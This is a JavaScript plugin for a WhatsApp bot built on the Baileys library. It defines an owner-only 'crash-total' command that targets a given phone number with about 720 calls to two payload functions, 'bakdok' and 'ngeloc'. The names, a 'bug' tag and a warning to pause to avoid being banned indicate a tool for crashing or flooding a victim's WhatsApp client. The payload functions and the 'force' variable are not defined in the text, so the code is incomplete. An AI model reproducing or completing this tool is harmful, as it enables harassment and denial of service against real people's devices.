const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const fs = require('fs');

let handler = async (m, { conn, usedPrefix, command, text }) => {
    const ownerNumber = '6285325268412';

    if (!text) {
        return m.reply(`Usage: ${usedPrefix}${command} 628xxxxxxxxx`);
    }

    const isOwner = m.sender === ownerNumber;
    if (!isOwner) {
        return m.reply(`Only the owner (${ownerNumber}) can use this command.`);
    }

    let bijipler = text.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`<!> The number should not start with 0. Please use a country code.\n\n<✓> Example: ${usedPrefix}${command} 6287392784527`);
    }

    let target = `${bijipler}@s.whatsapp.net`;
    await m.reply(`Processing...`);

    for (let j = 0; j < 30; j++) {
        await bakdok(target, force);
        await ngeloc(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
        await bakdok(target, force);
        await ngeloc(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
        await bakdok(target, force);
        await ngeloc(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
        await bakdok(target, force);
        await ngeloc(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
        await ngeloc(target, force);
        await bakdok(target, force);
    }

    await m.reply(`<✓> Successfully sent messages to ${bijipler} using ${command}. ✅\n\n<!> Please pause for 2 minutes to avoid being banned.`);
};

handler.help = ['crash-total'].map(v => v + ' 6281xx');
handler.tags = ['owner', 'bug'];
handler.command = /^(crash-total)$/i;
handler.owner = true;

module.exports = handler;